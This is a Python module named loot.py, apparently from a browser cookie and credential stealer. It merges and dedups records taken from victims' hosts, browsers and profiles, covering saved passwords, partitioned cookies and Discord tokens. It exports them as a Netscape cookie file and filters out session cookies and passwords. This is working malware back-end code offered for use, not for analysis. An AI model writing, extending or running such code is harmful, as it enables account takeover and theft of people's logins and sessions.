# cklog/loot.py -- record identity, filters and file writers shared by
# listen.py, sink.py and the analysis tools.
#
# Identity rules are load-bearing: a plain domain+name+path key collapsed every
# saved login of a domain (all name='password') and every cross-profile cookie.
# Partitioned cookies (CHIPS) and Firefox containers carry _partition, so they
# must not collapse either. Discord tokens are the exception where value is part
# of the identity: one profile can hold several accounts under name='token'.
import json
import os


def expiry(c):
    """The payload writes expirationDate; cookielog.py writes expires."""
    try:
        return int(c.get("expirationDate") or c.get("expires") or 0)
    except (TypeError, ValueError):
        return 0


def identity(c):
    extra = c.get("value") if c.get("name") == "token" else None
    return (c.get("_host"), c.get("browser"), c.get("profile"),
            c.get("domain"), c.get("name"), c.get("path"),
            c.get("_username"), extra, c.get("_partition"))


def merge(old, new, replace=True):
    """Dedup new records into old.

    replace=True  -- newest value wins, order of `old` preserved (listen.py).
    replace=False -- first value wins (sink.py, one-shot pipe batches).
    """
    seen, out = {}, list(old)
    for i, c in enumerate(out):
        seen[identity(c)] = i
    for c in new:
        if not isinstance(c, dict):
            continue
        k = identity(c)
        if k in seen:
            if replace:
                out[seen[k]] = c
        else:
            seen[k] = len(out)
            out.append(c)
    return out


def load_json(path):
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
            return data if isinstance(data, list) else []
        except Exception:
            pass
    return []


def write_json(path, rows):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(rows, f, ensure_ascii=False, indent=1)


def netscape(rows):
    lines = ["# Netscape HTTP Cookie File"]
    for c in rows:
        dom = c.get("domain") or ""
        if not dom:
            continue
        if not dom.startswith("."):
            dom = "." + dom
        lines.append("\t".join([dom, "TRUE", c.get("path") or "/",
                                "TRUE" if c.get("secure") else "FALSE",
                                str(expiry(c)), c.get("name") or "",
                                c.get("value") or ""]))
    return "\n".join(lines) + "\n"


def write_txt(path, rows):
    with open(path, "w", encoding="utf-8") as f:
        f.write(netscape(rows))


def filter_cookies(rows):
    return [c for c in rows if c.get("name") != "password"]


def filter_passwords(rows):
    return [c for c in rows if c.get("name") == "password"]


def filter_session(rows):
    """Real session cookies: no expiry, excluding password records."""
    return [c for c in rows if not expiry(c) and c.get("name") != "password"]
